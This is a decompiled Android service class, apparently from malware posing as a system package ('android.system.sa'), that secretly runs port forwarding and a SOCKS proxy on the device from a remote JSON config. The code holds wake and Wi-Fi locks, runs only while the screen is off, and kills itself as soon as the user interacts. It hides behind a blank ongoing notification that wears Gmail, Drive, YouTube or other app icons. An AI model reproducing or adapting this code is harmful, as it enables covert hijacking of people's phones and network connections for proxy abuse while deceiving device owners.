package android.system.sa;

import android.R;
import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.system.ap.Utils2;
import android.system.f.YM;
import com.my.es.target.ads.MyTargetVideoView;
import com.my.es.target.nativeads.banners.NavigationType;
import org.json.JSONObject;

/* loaded from: classes2.dex */
public class SS extends Service {
    private Service a;
    private PowerManager b;
    private PowerManager.WakeLock c;
    private WifiManager.WifiLock d;
    private JSONObject e;

    @Override // android.app.Service
    public void onCreate() {
        super.onCreate();
        this.b = (PowerManager) getSystemService("power");
    }

    @Override // android.app.Service
    public int onStartCommand(Intent intent, int i, int i2) {
        this.a = this;
        try {
            this.e = new JSONObject(intent.getExtras().getString("socks"));
        } catch (Exception e) {
            YM.a(this.a, "exit", e.toString());
            stopSelf();
            System.exit(0);
        }
        try {
            a();
            f();
            Logger9.a("startExitThread");
            c();
            Logger9.a("startSocksAsyncTask");
            e();
            return 2;
        } catch (Exception e2) {
            Logger9.a(e2.toString());
            YM.a(this.a, "exit", e2.toString());
            stopSelf();
            System.exit(0);
            return 2;
        }
    }

    private void a() {
        try {
            this.c = ((PowerManager) getSystemService("power")).newWakeLock(1, "lock");
            this.c.acquire();
            this.d = ((WifiManager) getSystemService("wifi")).createWifiLock(1, "lock");
            this.d.acquire();
        } catch (Exception e) {
            System.exit(0);
        }
    }

    private void b() {
        try {
            if (this.d != null && !this.d.isHeld()) {
                this.d.release();
            }
            if (this.c == null || this.c.isHeld()) {
                return;
            }
            this.c.release();
        } catch (Exception e) {
            Logger9.a(e.toString());
        }
    }

    private void c() throws Exception {
        new Thread(new Runnable() { // from class: android.system.sa.SS.1
            @Override // java.lang.Runnable
            @SuppressLint({"NewApi"})
            public void run() throws InterruptedException {
                long jLongValue;
                try {
                    long jCurrentTimeMillis = System.currentTimeMillis();
                    try {
                        jLongValue = (Long.valueOf(SS.this.e.getString(MyTargetVideoView.COMPLETE_STATUS_TIMEOUT)).longValue() * 1000) + jCurrentTimeMillis;
                    } catch (Exception e) {
                        e.printStackTrace();
                        jLongValue = 0;
                    }
                    while (true) {
                        if (Build.VERSION.SDK_INT < 20) {
                            if (SS.this.b.isScreenOn()) {
                                SS.this.a("powerManager");
                                return;
                            }
                        } else if (SS.this.b.isInteractive()) {
                            SS.this.a("powerManager");
                            return;
                        }
                        if (jLongValue == jCurrentTimeMillis || System.currentTimeMillis() <= jLongValue) {
                            if (!SS.this.d()) {
                                SS.this.a("no internet");
                            }
                            try {
                                Thread.currentThread();
                                Thread.sleep(100L);
                            } catch (InterruptedException e2) {
                            }
                        } else {
                            SS.this.a(MyTargetVideoView.COMPLETE_STATUS_TIMEOUT);
                            return;
                        }
                    }
                } catch (Exception e3) {
                    Logger9.a("catch works");
                    SS.this.a("Exception");
                }
            }
        }).start();
    }

    /* JADX INFO: Access modifiers changed from: private */
    public boolean d() {
        NetworkInfo activeNetworkInfo = ((ConnectivityManager) getSystemService("connectivity")).getActiveNetworkInfo();
        return activeNetworkInfo != null && activeNetworkInfo.isConnectedOrConnecting();
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void a(String str) {
        Logger9.a("closing socks from " + str);
        YM.a(this.a, "exit", str);
        b();
        PortForwardingR.a();
        if (this.a != null) {
            this.a.stopForeground(true);
        }
        this.a.stopSelf();
        System.exit(0);
    }

    private void e() {
        new a().execute(new Integer[0]);
    }

    class a extends AsyncTask<Integer, Void, Void> {
        a() {
        }

        /* JADX INFO: Access modifiers changed from: protected */
        @Override // android.os.AsyncTask
        /* renamed from: a, reason: merged with bridge method [inline-methods] */
        public Void doInBackground(Integer... numArr) {
            try {
                YM.a(SS.this.a, "starting", null);
                Logger9.a("PortForwardingR.start");
                PortForwardingR.a(SS.this.a, SS.this.e);
                Logger9.a("SOCKS.start");
                SOCKS.a(SS.this.a, SS.this.e);
            } catch (Exception e) {
                YM.a(SS.this.a, "exit", e.toString());
                e.printStackTrace();
                Logger9.a(e.toString());
                SS.this.a.stopSelf();
                System.exit(0);
            }
            return null;
        }
    }

    @SuppressLint({"NewApi"})
    private void f() {
        Notification notification;
        Intent intent = new Intent(this, (Class<?>) Activity.class);
        intent.setAction("socks");
        intent.setFlags(268468224);
        PendingIntent activity = PendingIntent.getActivity(this, 0, intent, 0);
        try {
            Bitmap bitmapB = b(this.e.getString("icon"));
            if (bitmapB != null) {
                Logger9.a("icon != null");
                if (Build.VERSION.SDK_INT >= 16) {
                    notification = new Notification.Builder(this).setContentTitle("").setContentText("").setLargeIcon(Bitmap.createScaledBitmap(bitmapB, 128, 128, false)).setSmallIcon(R.drawable.btn_star_big_on).setContentIntent(activity).setOngoing(true).build();
                } else {
                    notification = new Notification.Builder(this).setContentTitle("").setContentText("").setLargeIcon(Bitmap.createScaledBitmap(bitmapB, 128, 128, false)).setSmallIcon(R.drawable.btn_star_big_on).setContentIntent(activity).setOngoing(true).getNotification();
                }
            } else {
                Logger9.a("icon = null");
                if (Build.VERSION.SDK_INT >= 16) {
                    notification = new Notification.Builder(this).setContentTitle("").setContentText("").setContentIntent(activity).setOngoing(true).build();
                } else {
                    notification = new Notification.Builder(this).setContentTitle("").setContentText("").setContentIntent(activity).setOngoing(true).getNotification();
                }
            }
            startForeground(101, notification);
        } catch (Exception e) {
            Logger9.a(e.toString());
            YM.a(this.a, "exit", e.toString());
            stopSelf();
            System.exit(0);
        }
    }

    private Bitmap b(String str) {
        if (str.equalsIgnoreCase("drive") || str.equalsIgnoreCase("gmail") || str.equalsIgnoreCase("music") || str.equalsIgnoreCase("services") || str.equalsIgnoreCase(NavigationType.STORE) || str.equalsIgnoreCase("youtube")) {
            return Utils2.a(this, "icons/" + str + ".png");
        }
        try {
            return Utils2.a(getPackageManager().getApplicationIcon(str));
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
            return null;
        }
    }

    @Override // android.app.Service
    public void onDestroy() {
        a("onDestroy");
        super.onDestroy();
    }

    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        return null;
    }
}